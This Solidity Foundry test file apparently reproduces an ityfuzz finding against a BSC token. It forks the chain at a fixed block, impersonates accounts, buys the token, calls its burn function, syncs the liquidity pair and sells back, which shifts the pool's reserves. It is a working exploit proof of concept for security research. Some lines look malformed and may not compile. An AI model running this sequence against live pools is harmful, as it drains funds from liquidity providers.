// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4,0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24 -c bsc --onchain-block-number 25529355 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0xbb1aeb738b16a4f99373682d5f23ccfa97fe5ebd, Reserves changed from (0x00000000000000000000000000000000000000000000000000058c985b4521fb_U256, 0x0000000000000000000000000000000000000000000000000003c6ca9f4ef670_U256) to (0x00000000000000000000000000000000000000000000000000058c985b4521fb_U256, 0x0000000000000000000000000000000000000000000000000003cd94ded3cd7a_U256)

================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] Router.swapExactETHForTokens{value: 28334.1282 Ether}(0, path:(WETH → 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4), address(this), block.timestamp);
   └─[1] 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.burn(0.5046 Ether)
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd.sync()
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd → WETH), address(this), block.timestamp);


 */

contract C0025 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 25529355);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 28334128246998716907748);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 28334128246998716907748
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        
        0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.call(abi.encodeWithSignature(
            "burn(uint256)",0.5046 Ether
        )); 
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd).sync();
        
        vm.startPrank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        uint256 amount0 = IERC20(0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd).balanceOf(address(this));
        IERC20(0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xBb1aEB738b16A4F99373682d5F23ccfa97Fe5Ebd;
        liq_path0[1] = address(weth);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
